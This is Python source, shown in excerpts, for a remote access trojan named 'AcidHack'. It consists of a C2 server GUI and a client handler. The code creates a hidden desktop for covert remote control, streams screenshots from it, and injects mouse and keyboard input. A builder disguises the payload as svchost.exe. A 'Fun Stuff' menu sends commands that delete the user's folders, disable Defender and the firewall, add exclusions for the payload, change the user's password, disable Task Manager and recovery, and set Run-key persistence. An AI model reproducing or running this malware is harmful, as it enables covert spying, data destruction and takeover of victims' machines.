...
# ============================================================
# SOCKET THREADS - FIXED: Proper QThread subclass
# ============================================================
class ClientHandler(QThread):
    ...
    def run(self):
        """Run in a separate thread — QThread.run() does NOT need to call exec_().
        
        PyQt signals are thread-safe: emit from this thread, 
        they're queued and delivered to the main GUI thread automatically.
        """
...
# ============================================================
# HVNC DIALOG - Hidden Virtual Network Computer
# ============================================================
class HVNCDialog(QDialog):
    """Hidden VNC using ScreenShareDisplay for interactive mouse/keyboard."""
    def __init__(self, client_id, send_cmd_func, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.send_cmd = send_cmd_func
        self.hvnc_running = False
        self.setWindowTitle(f"AcidHack - HVNC (Hidden Desktop) [{client_id}]")
        ...
        self.status_label = QLabel("HVNC: Not started")
        self.status_label.setStyleSheet("color:#ffaa00;font-weight:bold;font-size:14px;padding:4px;")
        ctrl_row.addWidget(self.status_label)
        
        self.btn_start = QPushButton("▶ START HVNC")
        self.btn_start.setStyleSheet("""
            QPushButton { background-color: #003300; color: #44ff44; font-weight: bold;
                border: 2px solid #44ff44; padding: 8px 20px; }
            QPushButton:hover { background-color: #005500; }
        """)
        self.btn_start.clicked.connect(self.start_hvnc)
        ctrl_row.addWidget(self.btn_start)
        
        self.btn_stop = QPushButton("■ STOP HVNC")
        self.btn_stop.setEnabled(False)
        self.btn_stop.setStyleSheet("""
            QPushButton { background-color: #440000; color: #ff4444; font-weight: bold;
                border: 2px solid #ff4444; padding: 8px 20px; }
            QPushButton:hover { background-color: #660000; }
        """)
        self.btn_stop.clicked.connect(self.stop_hvnc)
        ctrl_row.addWidget(self.btn_stop)
        ctrl_row.addStretch()
        layout.addLayout(ctrl_row)

        # Use ScreenShareDisplay for interactive mouse/keyboard
        self.display = ScreenShareDisplay()
        self.display.setMinimumSize(800, 600)
        self.display.setStyleSheet("background-color: #000000; border: 1px solid #330000; border-radius: 4px;")
        
        # Connect mouse/keyboard signals directly to HVNC commands
        self.display.mouse_event_signal.connect(self.on_mouse_event)
        self.display.keyboard_event_signal.connect(self.on_keyboard_event)
        ...
        self.chk_mouse.setChecked(True)
        self.chk_mouse.setStyleSheet("color: #ff4444; font-weight: bold;")
        bottom_row.addWidget(self.chk_mouse)
        
        self.chk_keyboard = QCheckBox("Keyboard Control")
        self.chk_keyboard.setChecked(True)
        self.chk_keyboard.setStyleSheet("color: #ff4444; font-weight: bold;")
        bottom_row.addWidget(self.chk_keyboard)
        
        bottom_row.addStretch()
        
        for label, cmd in [("Ctrl+Alt+Del", "ctrl+alt+del"), ("Win+R", "win+r"),
                           ("Win+E", "win+e"), ("Alt+F4", "alt+f4"), ("Esc", "esc")]:
            btn = QPushButton(label)
            btn.setMaximumWidth(120)
            btn.clicked.connect(lambda _, k=cmd: self.send_hotkey(k))
        ...
        # Screenshot timer for preview
        self.timer = QTimer()
        self.timer.timeout.connect(self.request_frame)
        
        parent.hvnc_dialogs[client_id] = self

    def start_hvnc(self):
        self.send_cmd("hvnc_start")
        self.hvnc_running = True
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.status_label.setText("HVNC: RUNNING (hidden desktop)")
        self.status_label.setStyleSheet("color:#44ff44;font-weight:bold;font-size:14px;")
        self.display.setFocus()
        self.display.set_control_enabled(True)
        self.timer.start(2000)

    def stop_hvnc(self):
        self.send_cmd("hvnc_stop")
        self.hvnc_running = False
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.status_label.setText("HVNC: Stopped")
        self.status_label.setStyleSheet("color:#ff4444;font-weight:bold;font-size:14px;")
    ...
    def request_frame(self):
        if self.hvnc_running:
            self.send_cmd("hvnc_screenshot")

    def update_frame(self, jpeg_data):
        if not self.hvnc_running: return
        pixmap = QPixmap()
        if pixmap.loadFromData(jpeg_data, "JPEG"):
            self.display.set_pixmap(pixmap)

    def on_mouse_event(self, event, button, x, y):
        """Route mouse events from display widget to HVNC commands."""
        if self.hvnc_running and self.chk_mouse.isChecked():
            if event == "move" and not button:
                self.send_cmd("hvnc_mouse", event="move", x=x, y=y)
            else:
                self.send_cmd("hvnc_mouse", event=event, button=button or "left", x=x, y=y)

    def on_keyboard_event(self, event, key):
        """Route keyboard events from display widget to HVNC commands."""
        if self.hvnc_running and self.chk_keyboard.isChecked():
            self.send_cmd("hvnc_keyboard", key=key)
    ...
    def closeEvent(self, event):
        ...
        try:
            p = self.parent()
            if p and hasattr(p, 'hvnc_dialogs') and self.client_id in p.hvnc_dialogs:
                del p.hvnc_dialogs[self.client_id]
        except:
            pass
        event.accept()
...
class BuilderDialog(QDialog):
    def __init__(self, parent=None):
        ...
        info_text = QLabel(
            ...
            "Saves as <b>svchost.exe</b> in AppData, then <b style='color:#ff4444;'>melts itself</b>.</span><br><br>"
            "<b style='color:#44ff44;'>Stage 2 - PAYLOAD.EXE</b><br>"
            "<span style='color:#ffffff;'>Served automatically by your C2 server on port+1.<br>"
            "Task Manager shows <b>\"svchost.exe\"</b>. File is NTFS locked.<br>"
...
def hc(cmd):
    ...
    # ====== HVNC: Hidden Virtual Desktop (TinyNuke Architecture) ======
    elif t == "hvnc_start":
        try:
            import ctypes
            import struct
            ...
            desktop_name = "HVD_" + str(int(time.time()))[-8:]
            
            # Create a NEW hidden desktop
            hvnc_desktop = user32.CreateDesktopA(
                desktop_name.encode(),
                None, None, 0,
                0x000F | 0x0020 | 0x0040 | 0x0080 | 0x0100 | 0x0200,  # GENERIC_ALL
                None
            )
            
            if not hvnc_desktop:
                # Try with standard access
                hvnc_desktop = user32.CreateDesktopA(
                    desktop_name.encode(), None, None, 0,
                    0x0002 | 0x0100, None
                )
            
            if not hvnc_desktop:
                err = kernel32.GetLastError()
                sj({"type": "cmd_output", "output": f"[HVNC] FAILED to create desktop. Error: {err}. Run as admin!"})
                debug(f"HVNC CreateDesktop failed: {err}")
            else:
                globals()['hvnc_desktop_handle'] = hvnc_desktop
                globals()['hvnc_desktop_name'] = desktop_name
                globals()['hvnc_active'] = True
                
                debug(f"HVNC: Desktop '{desktop_name}' created. Handle={hvnc_desktop}")
                
                # Save the ORIGINAL desktop before switching
                orig_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
                globals()['hvnc_orig_desktop'] = orig_desktop
                
                # CRITICAL: Switch this thread to the hidden desktop
                # All subsequent window operations will be on the hidden desktop
                if not user32.SetThreadDesktop(hvnc_desktop):
                    debug(f"HVNC: SetThreadDesktop failed: {kernel32.GetLastError()}")
                
                # Now launch explorer.exe - it will run on the hidden desktop
                # because our thread is attached to it
                ...
                globals()['hvnc_explorer_pid'] = proc.pid
                
                sj({"type": "cmd_output", "output": f"[HVNC] Hidden desktop '{desktop_name}' created\\n"
                                                     f"[HVNC] Explorer PID: {proc.pid}\\n"
                                                     f"[HVNC] Desktop is ON THIS THREAD - user won't see it"})
                
                # ---- CAPTURE THREAD ----
                # This captures the hidden desktop by:
                # 1. Creating a DC compatible with the hidden desktop
                # 2. Using BitBlt to grab the pixels
                # 3. Sending as JPEG to server
                def hvnc_capture():
                    import io
                    
                    # Set this capture thread to the hidden desktop too
                    user32_cap = ctypes.windll.user32
                    kernel32_cap = ctypes.windll.kernel32
                    gdi32_cap = ctypes.windll.gdi32
                    
                    # Switch this thread to hidden desktop
                    user32_cap.SetThreadDesktop(hvnc_desktop)
                    
                    time.sleep(2)  # Wait for explorer to load
                    
                    while globals().get('hvnc_active', False):
                        try:
                            # Get the hidden desktop's DC
                            hdc_desk = user32_cap.GetDC(None)
                            if not hdc_desk:
                                time.sleep(1)
                                continue
                            
                            # Get dimensions
                            w = user32_cap.GetSystemMetrics(0)
                            h = user32_cap.GetSystemMetrics(1)
                            
                            if w <= 0 or h <= 0:
                                w, h = 1920, 1080
                            
                            # Create compatible DC and bitmap
                            hdc_mem = gdi32_cap.CreateCompatibleDC(hdc_desk)
                            hbmp = gdi32_cap.CreateCompatibleBitmap(hdc_desk, w, h)
                            old_obj = gdi32_cap.SelectObject(hdc_mem, hbmp)
                            
                            # BitBlt from hidden desktop to our memory DC
                            gdi32_cap.BitBlt(hdc_mem, 0, 0, w, h, hdc_desk, 0, 0, 0x00CC0020)  # SRCCOPY
                            
                            # Create bitmap info header
                            bmp_info = ctypes.create_string_buffer(40)
                            struct.pack_into('IIIiiHHIIII', bmp_info, 0,
                                40, w, h, 1, 24, 0, 0, 0, 0, 0)
                            
                            pixel_size = w * h * 3
                            pixels = ctypes.create_string_buffer(pixel_size)
                            
                            # Get the bitmap bits
                            ret = gdi32_cap.GetDIBits(hdc_mem, hbmp, 0, h, pixels, bmp_info, 0)
                            
                            # Cleanup
                            gdi32_cap.SelectObject(hdc_mem, old_obj)
                            gdi32_cap.DeleteObject(hbmp)
                            gdi32_cap.DeleteDC(hdc_mem)
                            user32_cap.ReleaseDC(None, hdc_desk)
                            
                            if ret and ret > 0:
                                # Convert to PIL Image and send as JPEG
                                from PIL import Image
                                img = Image.frombytes('RGB', (w, h), pixels, 'raw', 'BGR', 0, -1)
                                b = io.BytesIO()
                                img.save(b, format="JPEG", quality=25)
                                sj({"type": "screenshare_frame",
                                    "frame": base64.b64encode(b.getvalue()).decode()})
                            
                        except Exception as e:
                            debug(f"HVNC capture error: {e}")
                        
                        time.sleep(1.5)
                
                threading.Thread(target=hvnc_capture, daemon=True).start()
                
        except Exception as e:
            sj({"type": "cmd_output", "output": f"[HVNC] Start error: {str(e)}"})
            debug(f"HVNC start error: {e}")
            import traceback
            debug(traceback.format_exc())
    
    elif t == "hvnc_stop":
        try:
            globals()['hvnc_active'] = False
            time.sleep(0.5)
            
            dh = globals().get('hvnc_desktop_handle')
            if dh:
                ctypes.windll.user32.CloseDesktop(dh)
            
            dn = globals().get('hvnc_desktop_name', '')
            sj({"type": "cmd_output", "output": f"[HVNC] Hidden desktop '{dn}' closed"})
            
            globals()['hvnc_desktop_handle'] = None
            globals()['hvnc_desktop_name'] = None
            
        except Exception as e:
            sj({"type": "cmd_output", "output": f"[HVNC] Stop error: {str(e)}"})
    
    elif t == "hvnc_screenshot":
        try:
            dh = globals().get('hvnc_desktop_handle')
            if not dh:
                return
            ...
            gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
            
            bmp_info = ctypes.create_string_buffer(40)
            import struct
            struct.pack_into('IIIiiHHIIII', bmp_info, 0, 40, w, h, 1, 24, 0, 0, 0, 0, 0)
            pixels = ctypes.create_string_buffer(w * h * 3)
            gdi32.GetDIBits(hdc_mem, hbmp, 0, h, pixels, bmp_info, 0)
        ...
        try:
            ...
            if ev == "move":
                ...
                if btn == "left":
                    ...
                    user32.mouse_event(0x0008, x, y, 0, 0)
                    time.sleep(0.01)
                    user32.mouse_event(0x0010, x, y, 0, 0)
            elif ev == "dblclick":
                if btn == "left":
                    for _ in range(2):
                        user32.mouse_event(0x0002, x, y, 0, 0)
            ...
            debug(f"HVNC mouse error: {e}")
    
    elif t == "hvnc_keyboard":
        try:
            user32 = ctypes.windll.user32
            ...
            VK_MAP = {
                ...
                "home": 0x24, "end": 0x23, "space": 0x20, "spacebar": 0x20,
                "ctrl": 0x11, "alt": 0x12, "win": 0x5B,
                "shift": 0x10,
                "f1": 0x70, "f2": 0x71, "f3": 0x72, "f4": 0x73,
                "f5": 0x74, "f6": 0x75, "f7": 0x76, "f8": 0x77,
                "f9": 0x78, "f10": 0x79, "f11": 0x7A, "f12": 0x7B,
                "del": 0x2E, "capslock": 0x14,
            }
            ...
            debug(f"HVNC keyboard error: {e}")
    
    elif t == "hvnc_launch":
        try:
            dn = globals().get('hvnc_desktop_name', '')
            app = cmd.get("app", "notepad.exe")
            ...
            if dn:
                ...
                proc = subprocess.Popen(app, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
                sj({"type": "cmd_output", "output": f"[HVNC] Launched '{app}' (PID: {proc.pid}) in hidden desktop"})
            else:
                sj({"type": "cmd_output", "output": "[HVNC] No hidden desktop active"})
        except Exception as e:
            sj({"type": "cmd_output", "output": f"[HVNC] Launch error: {e}"})
        ...
        def sst(ssock):
            ...
            import io  # <-- FIX: import inside the function
            ...
            try:
                ...
                while screenshare_running:
                    t0 = time.time()
                    b = io.BytesIO()  # <-- Now io is defined
...
class AcidHackMainWindow(QMainWindow):
    ...
    def setup_ui(self):
        ...
        # HVNC is available via right-click context menu -> "HVNC (Hidden Desktop)"
        # which opens a separate dialog window (no tab needed)
    ...
    def setup_command_tab(self):
        ...
        self.cmd_input.returnPressed.connect(self.on_cmd_return_pressed)
        self.btn_execute = QPushButton("Execute")
        self.btn_execute.clicked.connect(self.on_cmd_return_pressed)
    ...
    def on_cmd_return_pressed(self):
        """Handle Enter key press in the command input field."""
    ...
    def execute_command(self, command_text):
        ...
        if not self.selected_client_id:
            self.cmd_output.append("[!] No client selected.\n")
        ...
        handler = self.client_handlers.get(self.selected_client_id)
        if handler:
            handler.send_command("execute", command=command_text)
            self.cmd_output.append(f"\n$ {command_text}\n{'-'*50}\n")
            self.cmd_input.clear()
            self.log_message(f"[>] Executed on {self.selected_client_id}: {command_text[:60]}")
        else:
            self.cmd_output.append("[!] Handler not found for selected client.\n")
            self.cmd_input.clear()
    ...
    def setup_hvnc_tab(self):
        layout = QVBoxLayout()
        
        # Info header
        self.hvnc_info_label = QLabel(
            "HVNC: Hidden Virtual Network Computer\n"
            "Creates a SEPARATE, HIDDEN desktop on the target machine.\n"
            "The user sees NOTHING — their screen stays normal.\n"
            "You get full desktop control in the hidden session."
        )
        self.hvnc_info_label.setStyleSheet("color:#44ff44;font-size:13px;padding:8px;border:1px solid #330000;border-radius:4px;")
        layout.addWidget(self.hvnc_info_label)

        # Control buttons row
        ctrl_row = QHBoxLayout()
        
        self.btn_hvnc_start = QPushButton("▶ START HVNC")
        self.btn_hvnc_start.setStyleSheet("""
            QPushButton { background-color: #003300; color: #44ff44; font-weight: bold;
                border: 2px solid #44ff44; padding: 10px 20px; font-size: 13px; }
            QPushButton:hover { background-color: #005500; }
        """)
        self.btn_hvnc_start.clicked.connect(self.hvnc_start)
        
        self.btn_hvnc_stop = QPushButton("■ STOP HVNC")
        self.btn_hvnc_stop.setEnabled(False)
        self.btn_hvnc_stop.setStyleSheet("""
            QPushButton { background-color: #440000; color: #ff4444; font-weight: bold;
                border: 2px solid #ff4444; padding: 10px 20px; font-size: 13px; }
            QPushButton:hover { background-color: #660000; }
        """)
        self.btn_hvnc_stop.clicked.connect(self.hvnc_stop)
        
        ctrl_row.addWidget(self.btn_hvnc_start)
        ctrl_row.addWidget(self.btn_hvnc_stop)
        ctrl_row.addStretch()
        
        self.lbl_hvnc_status = QLabel("Status: Idle")
        self.lbl_hvnc_status.setStyleSheet("color:#ffaa00;font-weight:bold;font-size:13px;")
        ctrl_row.addWidget(self.lbl_hvnc_status)
        
        layout.addLayout(ctrl_row)

        # Screenshot viewer for HVNC desktop
        self.hvnc_display = QLabel("HVNC Desktop Preview")
        self.hvnc_display.setAlignment(Qt.AlignCenter)
        self.hvnc_display.setMinimumSize(640, 480)
        self.hvnc_display.setStyleSheet("background-color:#000000;color:#555;border:1px solid #330000;border-radius:4px;")
        layout.addWidget(self.hvnc_display, 1)

        # Mouse event row
        mouse_row = QHBoxLayout()
        self.btn_hvnc_click = QPushButton("Left Click")
        self.btn_hvnc_click.clicked.connect(lambda: self.hvnc_mouse_event("click", "left"))
        self.btn_hvnc_rclick = QPushButton("Right Click")
        self.btn_hvnc_rclick.clicked.connect(lambda: self.hvnc_mouse_event("click", "right"))
        self.btn_hvnc_dclick = QPushButton("Double Click")
        self.btn_hvnc_dclick.clicked.connect(lambda: self.hvnc_mouse_event("dblclick", "left"))
        
        self.lbl_hvnc_coords = QLabel("Coords: 0, 0")
        self.lbl_hvnc_coords.setStyleSheet("color:#ffffff;font-size:12px;")
        mouse_row.addWidget(self.btn_hvnc_click)
        mouse_row.addWidget(self.btn_hvnc_rclick)
        mouse_row.addWidget(self.btn_hvnc_dclick)
        mouse_row.addStretch()
        mouse_row.addWidget(self.lbl_hvnc_coords)
        layout.addLayout(mouse_row)

        # Coordinate + keyboard input row
        input_row = QHBoxLayout()
        input_row.addWidget(QLabel("X:"))
        self.hvnc_x_input = QSpinBox()
        self.hvnc_x_input.setRange(0, 7680)
        self.hvnc_x_input.setValue(400)
        input_row.addWidget(self.hvnc_x_input)
        input_row.addWidget(QLabel("Y:"))
        self.hvnc_y_input = QSpinBox()
        self.hvnc_y_input.setRange(0, 4320)
        self.hvnc_y_input.setValue(300)
        input_row.addWidget(self.hvnc_y_input)
        
        self.btn_hvnc_moveto = QPushButton("Move To")
        self.btn_hvnc_moveto.clicked.connect(self.hvnc_move_mouse)
        input_row.addWidget(self.btn_hvnc_moveto)
        
        input_row.addWidget(QLabel("  |  Type:"))
        self.hvnc_type_input = QLineEdit()
        self.hvnc_type_input.setPlaceholderText("Type text and press Enter...")
        self.hvnc_type_input.returnPressed.connect(self.hvnc_type_text)
        input_row.addWidget(self.hvnc_type_input, 1)
        self.btn_hvnc_type = QPushButton("Send Keys")
        self.btn_hvnc_type.clicked.connect(self.hvnc_type_text)
        input_row.addWidget(self.btn_hvnc_type)
        
        layout.addLayout(input_row)

        # Special keys row
        special_row = QHBoxLayout()
        for key_text, key_name in [
            ("Ctrl+Alt+Del", "ctrl+alt+del"), ("Win+R", "win+r"),
            ("Win+E", "win+e"), ("Alt+F4", "alt+f4"),
            ...
            btn.clicked.connect(lambda _, k=key_name: self.hvnc_send_keys(k))
            special_row.addWidget(btn)
        special_row.addStretch()
        layout.addLayout(special_row)

        # Quick launch row
        quick_row = QHBoxLayout()
        quick_row.addWidget(QLabel("Quick Launch:"))
        for app_text, app_cmd in [
            ("CMD", "cmd.exe"),
            ...
            btn = QPushButton(app_text)
            btn.setMaximumWidth(120)
            btn.clicked.connect(lambda _, a=app_cmd: self.hvnc_launch_app(a))
            quick_row.addWidget(btn)
        quick_row.addStretch()
        layout.addLayout(quick_row)

        # HVNC screenshots
        self.hvnc_screenshot_data = None
        self.hvnc_running = False

        self.hvnc_tab.setLayout(layout)
    ...
    def verify_server_listening(self):
        try:
            ...
            test_sock.close()
            self.log_message(f"[+] C2 verified: port {PORT} is listening")
        except Exception as e:
            self.log_message(f"[!] C2 NOT LISTENING on port {PORT}: {e}")
    ...
    def on_new_client(self, client_sock, addr, client_id):
        ...
        handler.start()  # QThread.start() calls run() in a new thread
    ...
    def show_client_menu(self, position):
        ...
        def send_cmd(command_text):
            """Send a command directly via the handler."""
            h.send_command("execute", command=command_text)
            self.cmd_output.append(f"\n$ {command_text}\n{'-'*50}")
            if self.cmd_input: self.cmd_input.clear()
            self.log_message(f"[>] Executed on {self.selected_client_id}: {command_text[:60]}")
        ...
        menu.addAction("HVNC (Hidden Desktop)", self.open_hvnc_dialog)
        
        # ─── FUN STUFF SUBMENU ───
        fun_menu = QMenu("🎯 Fun Stuff", menu)
        fun_menu.setStyleSheet("""
            QMenu { background-color: #0d0d0d; color: #ffffff; border: 1px solid #330000; }
            QMenu::item { padding: 8px 32px 8px 16px; border-radius: 3px; }
            QMenu::item:selected { background-color: #4a0000; color: #ff6666; }
            QMenu::separator { height: 1px; background: #330000; margin: 4px 8px; }
        """)

        # --- UI Pranks ---
        sys_menu = fun_menu.addMenu("🖥️ System Pranks")
        sys_menu.addAction("Brick PC (Kill Explorer + Block Reboot)", 
            lambda: send_cmd(
                'taskkill /f /im explorer.exe & '
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe" '
                '/v Debugger /t REG_SZ /d "systray.exe" /f'
            ))
        sys_menu.addAction("Blue Screen Prank (fake BSOD on next logon)",
            lambda: send_cmd(
                'reg add "HKCU\\Control Panel\\Desktop" /v AutoEndTasks /t REG_SZ /d "1" /f & '
                'reg add "HKCU\\Control Panel\\Desktop" /v HungAppTimeout /t REG_SZ /d "1000" /f & '
                'reg add "HKCU\\Control Panel\\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d "1000" /f & '
                'msg * "CRITICAL_ERROR: SYSTEM_CRASH_LOGGED"'
            ))
        sys_menu.addAction("Swap Mouse Buttons (chaos)",
            lambda: send_cmd(
                'powershell -Command "& {'
                '$swap = Get-ItemProperty \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons; '
                'if ($swap.SwapMouseButtons -eq 1) { Set-ItemProperty \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons -Value 0 } '
                'else { Set-ItemProperty \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons -Value 1 }'
                '}"'
            ))
        sys_menu.addAction("Invert Screen Colors (accessibility troll)",
            lambda: send_cmd(
                'powershell -Command "& {'
                '$regPath = \'HKCU:\\Software\\Microsoft\\ColorFiltering\'; '
                'if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }; '
                '$current = (Get-ItemProperty -Path $regPath -Name \'Active\' -ErrorAction SilentlyContinue).Active; '
                'if ($current -eq 1) { Set-ItemProperty -Path $regPath -Name \'Active\' -Value 0; Write-Host \'OFF\' } '
                'else { Set-ItemProperty -Path $regPath -Name \'Active\' -Value 1; '
                'Set-ItemProperty -Path $regPath -Name \'FilterType\' -Value 1; Write-Host \'ON\' }'
                '}"'
            ))
        sys_menu.addAction("Pop All Volume to Max",
            lambda: send_cmd(
                'powershell -Command "& {$v = new-object -ComObject WScript.Shell; '
                'for($i=0;$i -le 100;$i+=5){$v.SendKeys([char]175)}; '
                'Write-Host \'VOLUME MAXED\'}"'
            ))
        sys_menu.addAction("Endless CMD Popups (fork bomb style)",
            lambda: send_cmd(
                'powershell -Command "& {while(1){start cmd}}"'
            ))

        # --- File / Data Destruction ---
        destroy_menu = fun_menu.addMenu("💀 Delete User Data")
        destroy_menu.addAction("Nuke User Downloads Folder",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\Downloads" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke User Desktop",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\Desktop" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke User Documents",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\Documents" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke User Pictures",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\Pictures" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke User Videos",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\Videos" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke OneDrive",
            lambda: send_cmd('rd /s /q "C:\\Users\\%USERNAME%\\OneDrive" 2>nul & echo GONE'))
        destroy_menu.addAction("Nuke Cookies & Browser Data",
            lambda: send_cmd(
        ...
        destroy_menu.addAction("Nuke ALL User Folders (destructive)",
            lambda: send_cmd(
                'rd /s /q "C:\\Users\\%USERNAME%\\Downloads" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Desktop" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Documents" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Pictures" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Videos" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Music" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\OneDrive" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Favorites" 2>nul & '
                'rd /s /q "C:\\Users\\%USERNAME%\\Contacts" 2>nul & '
                'echo NUKE COMPLETE'))

        # --- Persistence / Startup ---
        persist_menu = fun_menu.addMenu("🔐 Persistence Checks")
        persist_menu.addAction("Check Startup Items (autoruns)",
            lambda: send_cmd(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" && '
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" && '
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" && '
                'echo --- && '
                'schtasks /query /fo LIST /v 2>nul | findstr /i "svchost WindowsHealth UpdateTask"'))
        persist_menu.addAction("Re-enable Startup Entry (force svchost on boot)",
            lambda: send_cmd(
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" '
                '/v svchost /t REG_BINARY /d 020000000000000000000000 /f & '
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "WindowsHealthService" /t REG_SZ /d '
                '"%APPDATA%\\Microsoft\\SysHealth\\svchost.exe" /f & '
                'echo STARTUP RE-ENABLED'))
        persist_menu.addAction("Check If Our Payload Is Running",
            lambda: send_cmd(
                'tasklist /fi "IMAGENAME eq svchost.exe" /nh 2>nul | findstr /i svchost >nul && '
                'echo [+] svchost.exe IS RUNNING || echo [-] svchost.exe NOT FOUND on tasklist'))
        persist_menu.addAction("Check All Startup Persistence Locations",
            lambda: send_cmd(
                'echo === Registry Run === && '
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul && '
                'echo === Registry RunOnce === && '
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" 2>nul && '
                'echo === Scheduled Tasks === && '
                'schtasks /query /fo LIST /v 2>nul | findstr /i "WindowsHealth" && '
                'echo === Startup Folder === && '
                'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul && '
                'echo === Boot Execute === && '
                'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v BootExecute 2>nul'))
        persist_menu.addAction("Disable Windows Recovery (reagentc)",
            lambda: send_cmd('reagentc /disable & echo WINDOWS RECOVERY DISABLED'))

        # --- Kill Everything ---
        kill_menu = fun_menu.addMenu("💥 Kill Processes")
        kill_menu.addAction("Kill All Active User Processes (safe mode style)",
            lambda: send_cmd(
                ...
                'echo USER PROCESSES KILLED'))
        kill_menu.addAction("Kill Security Tools (defender, firewall, AV)",
            lambda: send_cmd(
                'net stop "Windows Defender" /y 2>nul & '
                'net stop "Security Center" /y 2>nul & '
                'net stop "Windows Firewall" /y 2>nul & '
                'net stop "WinDefend" /y 2>nul & '
                'taskkill /f /im MsMpEng.exe 2>nul & '
                'taskkill /f /im msseces.exe 2>nul & '
                'sc stop WinDefend 2>nul & '
                'sc config WinDefend start= disabled 2>nul & '
                'echo DEFENDER/AV PROCESSES KILLED'))
        kill_menu.addAction("Task Manager Destruction (can't re-open it)",
            lambda: send_cmd(
                'taskkill /f /im Taskmgr.exe 2>nul & '
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                '/v DisableTaskMgr /t REG_DWORD /d 1 /f & '
                'echo TASK MANAGER DISABLED'))
        kill_menu.addAction("Kill EVERYTHING (mass process kill)",
            lambda: send_cmd(
                'for /f "skip=3 tokens=1" %i in (\'tasklist /fi "pid gt 1000" /nh ^| findstr /v '
                '/i "System Idle svchost csrss wininit services lsass smss System"\''
                ') do taskkill /f /pid %i 2>nul & echo MASS KILL EXECUTED'))

        # --- Lockdown / Hardening Bypass ---
        lockdown_menu = fun_menu.addMenu("🔒 Lockdown & Bypass")
        lockdown_menu.addAction("Disable Windows Defender Real-Time",
            lambda: send_cmd(
                'powershell -Command "& {Set-MpPreference -DisableRealtimeMonitoring $true; '
                'Set-MpPreference -DisableBehaviorMonitoring $true; '
                'Set-MpPreference -DisableBlockAtFirstSeen $true; '
                'Set-MpPreference -DisableIOAVProtection $true; '
                'Write-Host \'DEFENDER REAL-TIME DISABLED\'}"'))
        lockdown_menu.addAction("Add Payload to Defender Exclusion",
            lambda: send_cmd(
                'powershell -Command "& {Add-MpPreference -ExclusionPath '
                '\'%APPDATA%\\Microsoft\\SysHealth\\\'; '
                'Write-Host \'EXCLUSION ADDED\'}"'))
        lockdown_menu.addAction("Lock User Out (change password + logoff)",
            lambda: send_cmd(
                'net user %USERNAME% P@ssw0rd_Changed! & '
                'echo PASSWORD CHANGED TO: P@ssw0rd_Changed!'))
        lockdown_menu.addAction("Registry Lockdown (block regedit, cmd, taskmgr)",
            lambda: send_cmd(
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                '/v DisableRegistryTools /t REG_DWORD /d 1 /f & '
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                '/v DisableCMD /t REG_DWORD /d 2 /f & '
                'echo REGEDIT + CMD DISABLED (reboot may be needed)'))

        # --- Additional Fun Commands ---
        extra_menu = fun_menu.addMenu("🎲 Extra Shenanigans")
        extra_menu.addAction("Open CD-ROM Tray (if available)",
            lambda: send_cmd(
                'powershell -Command "& {(New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject(); '
                'Write-Host \'CD TRAY OPENED\'}"'))
        extra_menu.addAction("Flip Screen Upside Down (rotate 180)",
            lambda: send_cmd(
                'powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; '
                '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width | Out-Null; '
                'Start-Process cmd -ArgumentList \'/c DISPLAY\\\"/c:0 /rotate:180\' -WindowStyle Hidden}" & '
                'echo SCREEN ROTATED 180'))
        extra_menu.addAction("Set Wallpaper to Solid Black (hide desktop)",
            lambda: send_cmd(
                'powershell -Command "& {$regPath = \'HKCU:\\Control Panel\\Desktop\'; '
                'Set-ItemProperty -Path $regPath -Name Wallpaper -Value \'\'; '
                'Set-ItemProperty -Path $regPath -Name WallpaperStyle -Value \'2\'; '
                'RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters; '
                'Write-Host \'WALLPAPER REMOVED\'}"'))
